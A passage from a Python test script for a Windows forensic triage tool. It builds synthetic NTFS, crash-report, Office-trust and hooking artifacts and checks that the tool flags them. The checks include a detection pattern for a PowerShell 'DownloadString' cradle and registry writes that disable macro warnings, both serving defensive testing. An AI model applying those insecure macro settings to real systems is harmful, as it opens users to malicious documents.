        print(f'FAIL timeline --root: sources missing: {sorted(keys)}'); fails += 1
    elif [r['time'] for r in tr] != sorted((r['time'] for r in tr), reverse=True):
        print('FAIL timeline --root: not newest first'); fails += 1
    elif not any(r['source'] == 'prefetch' and 'EVIL.EXE' in r['event'] and r['suspicious'] for r in tr):
        print('FAIL timeline --root: prefetch run missing'); fails += 1
    else:
        print(f'checked timeline --root  ({len(tr)} rows from the synthetic image)')
except Exception as e:
    print('FAIL timeline --root check:', e, out[:200]); fails += 1

# usn / mft: a hand-built $MFT (Users\bob\Downloads) and change journal:
# invoice.pdf created and renamed to invoice.exe (flagged), tool.ps1 deleted
# (flagged), notes.txt created (not flagged); --mft rebuilds the folder.
import ntfswrite as nw
ntd = os.path.join(pfx, 'drive_c', 'ntfs'); os.makedirs(ntd, exist_ok=True)
T0 = 133500000000000000
ents = {5: dict(name='.', parent=5, dir=True, seq=5, parent_seq=5),
        40: dict(name='Users', parent=5, parent_seq=5, dir=True, seq=1),
        41: dict(name='bob', parent=40, dir=True, seq=1),
        42: dict(name='Downloads', parent=41, dir=True, seq=3),
        50: dict(name='invoice.exe', parent=42, parent_seq=3, seq=2, size=4096,
                 si=[T0 - 10**15, T0, T0, T0], fn=[T0, T0, T0, T0])}
with open(os.path.join(ntd, 'MFT'), 'wb') as f:
    f.write(nw.mft(ents, 64))
dl = 42 | (3 << 48)
with open(os.path.join(ntd, 'J'), 'wb') as f:
    f.write(nw.usn([(50 | (2 << 48), dl, T0, 0x100, 'invoice.pdf'),
                    (50 | (2 << 48), dl, T0 + 10, 0x1000, 'invoice.pdf'),
                    (50 | (2 << 48), dl, T0 + 10, 0x2000, 'invoice.exe'),
                    (51 | (1 << 48), dl, T0 + 20, 0x80000200, 'tool.ps1'),
                    (52 | (1 << 48), dl, T0 + 30, 0x100, 'notes.txt'),
                    (53 | (1 << 48), 99 | (7 << 48), T0 + 40, 0x100, 'lost.txt')]))
rc, out, err = wine([exe, 'usn', r'C:\ntfs\J', '--mft', r'C:\ntfs\MFT', '--json'])
try:
    ur = json.loads(out)
    fl = {r['name']: r['reason'] for r in ur if r['suspicious']}
    folders = {r['name']: r['folder'] for r in ur}
    if fl != {'invoice.exe': 'renamed into a program or script', 'tool.ps1': 'program or script deleted'}:
        print(f'FAIL usn: flags {fl}'); fails += 1
    elif folders.get('notes.txt') != '\\Users\\bob\\Downloads' or 'reused or missing' not in folders.get('lost.txt', ''):
        print(f'FAIL usn --mft: folders {folders}'); fails += 1
    elif not any(r['old_name'] == 'invoice.pdf' for r in ur if r['name'] == 'invoice.exe'):
        print('FAIL usn: old name not paired with the new one'); fails += 1
    else:
        print('checked usn --mft --json  (rename into exe and deleted script flagged, folders from the $MFT)')
except Exception as e:
    print('FAIL usn check:', e, out[:200]); fails += 1
rc, out, err = wine([exe, 'mft', r'C:\ntfs\MFT', '--timestomp', '--json'])
try:
    mr = json.loads(out)
    if [r['path'] for r in mr] != ['\\Users\\bob\\Downloads\\invoice.exe']:
        print(f'FAIL mft (synthetic): {mr}'); fails += 1
    else:
        print('checked mft --timestomp  (synthetic $MFT: backdated invoice.exe listed with its path)')
except Exception as e:
    print('FAIL mft synthetic check:', e, out[:200]); fails += 1

# sweep: one valid JSON document with every check as a key; checks that
# cannot run under wine (WMI, event logs) must be null or empty, not broken.
rc, out, err = wine([exe, 'sweep', '--json'], timeout=600)
try:
    d = json.loads(out)
    want = ['posture', 'hunt', 'hidden', 'net', 'autoruns', 'services', 'tasks', 'taskcache',
            'firewall', 'prefetch', 'pca', 'defender', 'wmi', 'users', 'comhijack', 'bits', 'pshistory', 'recyclebin', 'browser', 'events']
    missing = [k for k in want if k not in d]
    if missing:
        print(f'FAIL sweep: missing keys {missing}'); fails += 1
    elif not d.get('autoruns') or any(not r.get('suspicious') for r in d['autoruns']):
        print(f"FAIL sweep: autoruns should hold only flagged entries: {d.get('autoruns')}"); fails += 1
    else:
        print('checked sweep --json  (all keys present, findings-only sections)')
    if not any('dropper.exe' in r.get('path', '') for r in (d.get('recyclebin') or [])) or \
            any('notes.docx' in r.get('path', '') for r in (d.get('recyclebin') or [])):
        print(f"FAIL sweep: recyclebin section should hold only the flagged item: {d.get('recyclebin')}"); fails += 1
    if not any('DownloadString' in r.get('command', '') for r in (d.get('pshistory') or [])):
        print(f"FAIL sweep: pshistory --all-users missed the download cradle: {d.get('pshistory')}"); fails += 1
except Exception as e:
    print('FAIL sweep check:', e, out[:200]); fails += 1

# --sig: every autoruns entry carries a signature verdict; a missing image is
# "missing" (Autoruns' "File not found"), never silently "trusted".
rc, out, err = wine([exe, 'autoruns', '--sig', '--json'], timeout=300)
try:
    rows = json.loads(out)
    allowed = {'embedded', 'catalog', 'untrusted', 'unresolved', 'missing', 'none'}
    bad = [r for r in rows if r.get('signature') not in allowed]
    upd = [r for r in rows if r.get('name') == 'Updater']
    if bad:
        print(f'FAIL autoruns --sig: unexpected signature values {bad[:2]}'); fails += 1
    elif not upd or upd[0]['signature'] != 'missing' or upd[0]['reason'] != 'user-writable path':
        print(f'FAIL autoruns --sig: missing image should be "missing": {upd}'); fails += 1
    elif not [r for r in rows if r.get('name') == 'certx' and r.get('signature') == 'missing']:
        print('FAIL autoruns --sig: missing AppCertDll not reported as missing'); fails += 1
    else:
        print('checked autoruns --sig --json  (verdict on every entry)')
except Exception as e:
    print('FAIL autoruns --sig check:', e, out[:200]); fails += 1

# A key shared between the 64-bit view and Wow6432Node must be reported once.
rc, out, err = wine([exe, 'autoruns', '--json'])
try:
    n = sum(1 for r in json.loads(out) if r.get('name') == 'sethc.exe')
    if n != 1:
        print(f'FAIL autoruns: sethc.exe reported {n} times, expected 1'); fails += 1
except Exception as e:
    print('FAIL autoruns dedupe check:', e); fails += 1

# verify / triage patch report: a helper overwrites the start of one of its
# own functions, first with a direct jump, then with a jump through a private
# trampoline page (what hooking libraries do). The report must name the
# section, show the original and the new bytes, decode the jump and say which
# module finally receives control - the evidence needed to tell a hooking
# product from a replaced image.
if cc:
    subprocess.run([cc, '-O1', os.path.join(here, '..', 'selfpatch.c'), '-o', os.path.join(fake, 'selfpatch.exe')], check=True)
    for mode in ('direct', 'tramp'):
        sp = subprocess.Popen([WINE, r'C:\fake\selfpatch.exe', mode], env=env, stdout=subprocess.PIPE,
                              stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, text=True)
        sp.stdout.readline()
        try:
            rc, out, err = wine([exe, 'list', '--json'])
            pid = [p['pid'] for p in json.loads(out) if p.get('name', '').lower() == 'selfpatch.exe'][-1]
            rc, out, err = wine([exe, 'verify', str(pid), '--json'])
            t = json.loads(out)['checks']['image_tamper']
            ps = t.get('patches', [])
            ok = (t['modified_sections'] == 1 and t['patch_count'] == 1 and len(ps) == 1 and ps[0]['section'] == '.text'
                  and ps[0]['disk'] != ps[0]['memory'] and int(ps[0]['target'], 16) != 0)
            if mode == 'direct':
                ok = ok and ps[0]['kind'] == 'jmp' and ps[0]['target_module'].lower() == 'selfpatch.exe' and ps[0]['memory'].startswith('E9')
            else:
                ok = ok and ps[0]['target_module'] == '' and ps[0]['final_module'].lower() == 'selfpatch.exe'
            rc, out2, err = wine([exe, 'triage', str(pid), '--json'])
            tj = json.loads(out2)['signals']
            ok = ok and tj['image_patch_count'] == 1 and len(tj['image_patches']) == 1
            rc, txt, err = wine([exe, 'triage', str(pid)])
            ok = ok and 'disk:' in txt and 'mem :' in txt and 'selfpatch.exe' in txt.split('image tamper')[1]
            if not ok:
                print(f'FAIL verify patches ({mode}): {json.dumps(t)[:400]}'); fails += 1
            else:
                print(f'checked verify/triage patch report ({mode}: bytes, jump decoded, destination module named)')
        except Exception as e:
            print(f'FAIL verify patches ({mode}):', e); fails += 1
        sp.kill()
        wine(['taskkill', '/f', '/im', 'selfpatch.exe'])

# mft --image: a raw NTFS volume image whose $MFT lies in three fragments,
# the last two described only by an extension record reached through record
# 0's $ATTRIBUTE_LIST (a fragmented $MFT on a real disk looks like this; the
# same code reads --live volumes). invoice.exe's record is in the LAST
# fragment, so it is found only when the list is followed. Without the list
# the read must say on stderr that it is incomplete instead of looking as if
# the file did not exist.
frags = [(4, 6), (40, 4), (20, 6)]
with open(os.path.join(ntd, 'vol.img'), 'wb') as f:
    f.write(nw.volume(nw.mft(ents, 64), frags, split=1))
with open(os.path.join(ntd, 'vol_nolist.img'), 'wb') as f:
    f.write(nw.volume(nw.mft(ents, 64), frags, split=1, attr_list=False))
with open(os.path.join(ntd, 'vol_whole.img'), 'wb') as f:
    f.write(nw.volume(nw.mft(ents, 64), frags))
try:
    rc, out, err = wine([exe, 'mft', '--image', r'C:\ntfs\vol.img', '--find', 'invoice', '--json'])
    a = [r['path'] for r in json.loads(out)]
    rc2, out2, err2 = wine([exe, 'mft', '--image', r'C:\ntfs\vol_nolist.img', '--find', 'invoice', '--json'])
    b = json.loads(out2)
    rc3, out3, err3 = wine([exe, 'mft', '--image', r'C:\ntfs\vol_whole.img', '--find', 'invoice', '--json'])
    c = [r['path'] for r in json.loads(out3)]
    rc4, out4, err4 = wine([exe, 'mft', '--image', r'C:\ntfs\MFT'])
    if a != ['\\Users\\bob\\Downloads\\invoice.exe'] or 'WARNING' in err:
        print(f'FAIL mft --image (attribute list): {a} {err[:200]}'); fails += 1
    elif b != [] or 'WARNING' not in err2 or 'missing' not in err2:
        print(f'FAIL mft --image (no list): expected an incomplete-read warning: {b} {err2[:200]}'); fails += 1
    elif c != a or 'WARNING' in err3:
        print(f'FAIL mft --image (all runs in record 0): {c} {err3[:200]}'); fails += 1
    elif rc4 != 1 or 'not an image of an NTFS volume' not in err4:
        print(f'FAIL mft --image on a non-volume: rc={rc4} {err4[:200]}'); fails += 1
    else:
        print('checked mft --image  (fragmented $MFT followed through its attribute list; incomplete read warned)')
except Exception as e:
    print('FAIL mft --image check:', e); fails += 1

# wer: two crash reports written the way Windows writes them (UTF-16LE with
# BOM, CRLF). The one under ProgramData is a program in a Temp folder ->
# flagged; the one in a user's profile is Word hanging with an add-in DLL from
# AppData -> listed, not flagged, the add-in shown only with --modules.
def wer_file(path, lines):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'wb') as f:
        f.write(b'\xff\xfe' + '\r\n'.join(lines).encode('utf-16-le'))
wer_file(os.path.join(pfx, 'drive_c', 'ProgramData', 'Microsoft', 'Windows', 'WER', 'ReportArchive',
                      'AppCrash_upd.exe_1a2b3c', 'Report.wer'),
         ['Version=1', 'EventType=APPCRASH', 'EventTime=133500000000000000', 'ReportIdentifier=11111111-2222',
          'Sig[0].Name=Application Name', 'Sig[0].Value=upd.exe', 'Sig[3].Name=Fault Module Name', 'Sig[3].Value=StackHash_9f1c',
          'Sig[6].Name=Exception Code', 'Sig[6].Value=c0000005',
          r'LoadedModule[0]=C:\Users\bob\AppData\Local\Temp\upd.exe', r'LoadedModule[1]=C:\Windows\SYSTEM32\ntdll.dll',
          r'AppPath=C:\Users\bob\AppData\Local\Temp\upd.exe', 'NsAppName=upd.exe', ''])
wer_file(os.path.join(pfx, 'drive_c', 'users', 'Public', 'AppData', 'Local', 'Microsoft', 'Windows', 'WER', 'ReportQueue',
                      'AppHang_WINWORD.EXE_77', 'Report.wer'),
         ['Version=1', 'EventType=AppHangB1', 'EventTime=133500000600000000',
          'Sig[0].Name=Application Name', 'Sig[0].Value=WINWORD.EXE',
          r'LoadedModule[0]=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE',
          r'LoadedModule[1]=C:\Users\bob\AppData\Roaming\addin\x.dll', ''])
try:
    rc, out, err = wine([exe, 'wer', '--json'])
    wr = json.loads(out)
    by = {r['program'].lower(): r for r in wr}
    crash, hang = by.get('upd.exe'), by.get('winword.exe')
    rc2, txt, err = wine([exe, 'wer', '--modules'])
    rc3, out3, err = wine([exe, 'wer', '--flagged', '--csv'])
    rc4, out4, err = wine([exe, 'wer', r'C:\ProgramData\Microsoft\Windows\WER', '--find', 'stackhash', '--json'])
    if not crash or not hang:
        print(f'FAIL wer: reports not found: {wr}'); fails += 1
    elif not (crash['suspicious'] and crash['time'] == '2024-01-17 21:20:00' and crash['fault_module'] == 'StackHash_9f1c'
              and crash['exception_code'] == 'c0000005' and crash['user'] == '(system)'):
        print(f'FAIL wer: crash report fields: {crash}'); fails += 1
    elif hang['suspicious'] or hang['user'] != 'Public' or hang['writable_modules'] != 1 or not hang['path'].endswith('WINWORD.EXE'):
        print(f'FAIL wer: hang report must be listed unflagged with its add-in counted: {hang}'); fails += 1
    elif wr[0]['program'].lower() != 'winword.exe':
        print('FAIL wer: newest report must come first'); fails += 1
    elif 'addin\\x.dll' not in txt or len(out3.strip().splitlines()) != 2 or 'upd.exe' not in out3:
        print(f'FAIL wer --modules / --flagged --csv: {txt[-300:]} {out3}'); fails += 1
    elif [r['program'] for r in json.loads(out4)] != ['upd.exe']:
        print(f'FAIL wer <folder> --find: {out4}'); fails += 1
    else:
        print('checked wer  (UTF-16 reports: Temp program flagged, Word hang with add-in not; folder / --find / --modules)')
except Exception as e:
    print('FAIL wer check:', e); fails += 1

# office: Trusted Documents, macro settings and trusted locations - once in
# the live HKCU (reg add) and once in an offline NTUSER.DAT built by the test
# hive writer. A macro-enabled download and a mail attachment are flagged; a
# macro-enabled workbook in Documents and an edit-only download are not;
# VBAWarnings=1 is flagged, the default 2 produces no row; a trusted location
# in Downloads is flagged, the stock Templates one is not.
def trec(ft, flags):
    return struct.pack('<QQII', ft, 0, 0, flags)
OT = 133500000000000000
OSEC = HKCU + r'Software\Microsoft\Office\16.0\Word\Security'
reg(OSEC + r'\Trusted Documents\TrustRecords', '/v', '%USERPROFILE%/Downloads/invoice.docm', '/t', 'REG_BINARY', '/d', trec(OT, 0x7FFFFFFF).hex())
reg(OSEC + r'\Trusted Documents\TrustRecords', '/v', '%USERPROFILE%/Downloads/readme.docx', '/t', 'REG_BINARY', '/d', trec(OT, 1).hex())
reg(OSEC + r'\Trusted Documents\TrustRecords', '/v', '%USERPROFILE%/Documents/budget.docm', '/t', 'REG_BINARY', '/d', trec(OT, 0x7FFFFFFF).hex())
reg(OSEC, '/v', 'VBAWarnings', '/t', 'REG_DWORD', '/d', '1')
reg(HKCU + r'Software\Microsoft\Office\16.0\Excel\Security', '/v', 'VBAWarnings', '/t', 'REG_DWORD', '/d', '2')
reg(OSEC + r'\Trusted Locations\Location9', '/v', 'Path', '/t', 'REG_SZ', '/d', 'C:\\Users\\bob\\Downloads\\')
reg(OSEC + r'\Trusted Locations\Location0', '/v', 'Path', '/t', 'REG_SZ', '/d', '%APPDATA%\\Microsoft\\Templates')
osec = K('Security', [rw.Value('AccessVBOM', rw.REG_DWORD, rw.dword(1))], [
    K('Trusted Documents', [], [K('TrustRecords', [
        rw.Value(r'C:/Users/bob/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/AB12/po.xlsm', rw.REG_BINARY, trec(OT + 600000000, 0x7FFFFFFF)),
        rw.Value('short', rw.REG_BINARY, b'\x01\x02\x03')])])])
pol = K('Policies', [], [K('Microsoft', [], [K('Office', [], [K('16.0', [], [K('Excel', [], [
    K('Security', [rw.Value('BlockContentExecutionFromInternet', rw.REG_DWORD, rw.dword(0))])])])])])])
with open(os.path.join(off, 'NTUSER_office.DAT'), 'wb') as f:
    f.write(rw.build(K('ROOT', [], [K('Software', [], [K('Microsoft', [], [K('Office', [], [
        K('Common', [], [K('Excel', [], [K('Security', [rw.Value('VBAWarnings', rw.REG_DWORD, rw.dword(1))])])]),
        K('16.0', [], [K('Excel', [], [osec])])])]), pol])])))
try:
    rc, out, err = wine([exe, 'office', '--json'])
    rows = json.loads(out)
    fl = {(r['kind'], r['item']): r['reason'] for r in rows if r['suspicious']}
    items = {r['item']: r for r in rows}
    want = {('document', '%USERPROFILE%\\Downloads\\invoice.docm'): 'macros enabled for a downloaded document',
            ('setting', 'VBAWarnings'): 'all macros run without notification (VBAWarnings=1)',
            ('location', 'C:\\Users\\bob\\Downloads\\'): 'trusted location in a download folder'}
    rc2, out2, err2 = wine([exe, 'office', '--hive', r'C:\offline\NTUSER_office.DAT', '--json'])
    hrows = json.loads(out2)
    hfl = sorted((r['kind'], r['application'], r['scope'], r['reason']) for r in hrows if r['suspicious'])
    hwant = sorted([('document', 'Excel', 'user', 'macros enabled for a mail attachment'),
                    ('setting', 'Excel', 'user', 'programmatic access to the VBA project is allowed (AccessVBOM=1)'),
                    ('setting', 'Excel', 'policy', 'macros in files from the internet are not blocked (policy set to 0)')])
    rc3, out3, err3 = wine([exe, 'office', '--flagged', '--csv'])
    if fl != want:
        print(f'FAIL office (live): flags {fl}'); fails += 1
    elif items['%USERPROFILE%\\Downloads\\invoice.docm']['time'] != '2024-01-17 21:20:00' or \
            'editing enabled' not in items['%USERPROFILE%\\Downloads\\readme.docx']['detail'] or \
            '%USERPROFILE%\\Documents\\budget.docm' not in items or '%APPDATA%\\Microsoft\\Templates' not in items:
        print(f'FAIL office (live): rows {rows}'); fails += 1
    elif sum(1 for r in rows if r['kind'] == 'setting') != 1:
        print('FAIL office: the default VBAWarnings=2 must not produce a row'); fails += 1
    elif hfl != hwant or len(hrows) != 3:
        print(f'FAIL office --hive: {hrows}'); fails += 1
    elif len(out3.strip().splitlines()) != 4:
        print(f'FAIL office --flagged --csv: {out3}'); fails += 1
    else:
        print('checked office  (live + offline hive: trusted documents, settings, locations; benign controls unflagged)')
except Exception as e:
    print('FAIL office check:', e); fails += 1
print(f'\n{fails} failure(s)')
sys.exit(1 if fails else 0)
